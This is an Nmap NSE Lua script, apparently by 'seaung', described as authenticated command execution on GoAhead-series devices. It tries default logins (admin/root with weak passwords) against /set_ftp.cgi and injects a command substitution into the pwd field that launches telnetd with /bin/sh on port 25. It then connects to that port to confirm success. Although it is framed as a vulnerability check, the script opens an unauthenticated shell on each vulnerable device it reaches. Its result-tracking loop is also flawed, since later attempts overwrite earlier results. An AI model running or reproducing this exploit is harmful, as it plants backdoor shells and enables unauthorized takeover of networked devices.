local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local nmap = require "nmap"


description = [[
GoAhead系列
经过身份认证后可执行系统命令
]]


author = "seaung"

license = "Same as Nmap--See https://nmap.org/book/man-legal.html"

categories = {"goahead_rce_01"}

portrule = shortport.port_or_service( {80, 443}, {"http", "https"}, "tcp", "open")

action = function(host, port)
	stdnse.verbose("[*] Starting check vulnreable.")

	local users = {"admin", "root"}
	local pawds = {"12345", "123456", "admin", "qwe123"}

	local output = stdnse.output_table()


	for key, value in ipairs(users) do
		for k, v in ipairs(pawds) do
			local path = string.format([[/set_ftp.cgi?next_url=ftp.htm&loginuse=%s&loginpas=%s&svr=192.168.1.1&port=21&user=ftp&pwd=$(telnetd -p25 -l/bin/sh)&dir=/&mode=PORT&upload_interval=0]], value, v)
			local response = http.get(host, port, path)

			if response.status == 200 then
				socket = nmap.new_socket()
				socket:set_timeout(10)
				local state, err = socket:connect(host.ip, 25)
				if not state then
					output = "Not vulnerable."
					socket:close()
				else
					output = "Found vulnerable."
					socket:close()
				end
			else
				output = "Not vulnerable."
			end 
		end
	end

	return output

end


